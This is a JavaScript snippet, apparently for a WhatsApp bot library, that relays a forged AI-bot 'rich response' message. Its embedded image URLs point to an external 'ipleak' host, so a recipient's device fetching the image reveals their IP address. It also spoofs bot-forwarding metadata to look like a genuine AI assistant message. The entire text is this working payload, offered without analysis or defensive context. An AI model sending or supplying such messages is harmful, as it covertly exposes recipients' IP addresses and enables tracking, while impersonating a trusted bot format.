await sock.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(
              JSON.stringify({
                "response_id": "24f4ec25-a8b4-45b5-8cb1-d2504e3ab640",
                "sections": [
                  {
                    "view_model": {
                      "primitive": {
                        "__typename": "GenAIImagePrimitive",
                        "preview_image": {
                          "__typename": "GenAIMediaItem",
                          "mime_type": "image/jpeg",
                          "url": "https://ipleak.nixel.dev/image/ip?timestamp=" + Date.now()
                        },
                        "full_image": {
                          "__typename": "GenAIMediaItem",
                          "mime_type": "image/jpeg",
                          "url": "https://ipleak.nixel.dev/image/ip?timestamp=" + Date.now()
                        }
                      },
                      "__typename": "GenAISingleLayoutViewModel"
                    }
                  }
                ]
              })).toString("base64")
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "0@bot"
            },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {}
); 